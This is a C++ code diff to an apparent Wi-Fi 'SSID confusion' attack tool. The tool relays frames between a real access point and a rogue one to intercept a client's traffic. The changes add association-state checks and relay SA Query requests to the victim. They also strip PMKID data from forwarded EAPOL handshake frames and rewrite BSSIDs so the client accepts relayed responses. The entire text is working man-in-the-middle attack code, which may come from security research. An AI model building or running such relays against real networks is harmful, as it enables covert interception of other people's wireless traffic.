@@ -57,6 +57,7 @@ FrameProcess SsidConfusion::handle_eapol_real(
 	const frame_raw_t &raw) const {
 	// EAPOL AP -> STA on real channel
 	if(addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
+		if(client_state.get_state() < ClientState::Associated) return STOP;
 		//TODO check first M1as PMKSA cache hit -> force EAP restart
 		const int msg = get_eapol_msg_num(pdu);
 		if(msg == 2 || msg == 4) return STOP; //block cycles
@@ -108,7 +109,7 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 
 	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
-	if(const auto *auth = dot11->find_pdu<Dot11Authentication>()) {
+	if(dot11->find_pdu<Dot11Authentication>()) {
 		display_traffic(*dot11, "Real channel", "-- Ignore");
 		return;
 	}
@@ -122,7 +123,7 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 
 	// relay real AP assoc response back to STA (rewrite BSSID so STA accepts it)
 	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()) {
-		if(addr1 == HWAddress<6>(sta.get(SK::mac))) {
+		if(addr1 == HWAddress<6>(sta.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
 			auto relayed = ensure_radiotap(raw);
 			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
 			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
@@ -135,10 +136,20 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
 	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;
 
-	if(addr1 == sta.get(SK::mac) || addr2 == ap.get(SK::mac)) {
-		// implicitly forward rest of frames STA -> AP
-		display_traffic(*pdu, "Real channel", " -- MitM'ing");
+	// SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
+	if(dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == 13 &&
+	   addr1 == HWAddress<6>(sta.get(SK::mac))) {
+		display_traffic(*dot11, "Real channel", " SA Query req -- relay to rogue");
 		send_to_rogue(raw);
+		return;
+	}
+
+	if((addr1 == sta.get(SK::mac) || addr2 == ap.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
+		// libtins truncates SNAP/EAPOL frames -> handle_eapol_real misses msg1; strip here as fallback
+		auto to_send = raw;
+		strip_pmkid_kde(to_send);
+		display_traffic(*pdu, "Real channel", " -- MitM'ing");
+		send_to_rogue(to_send);
 	}
 }
 
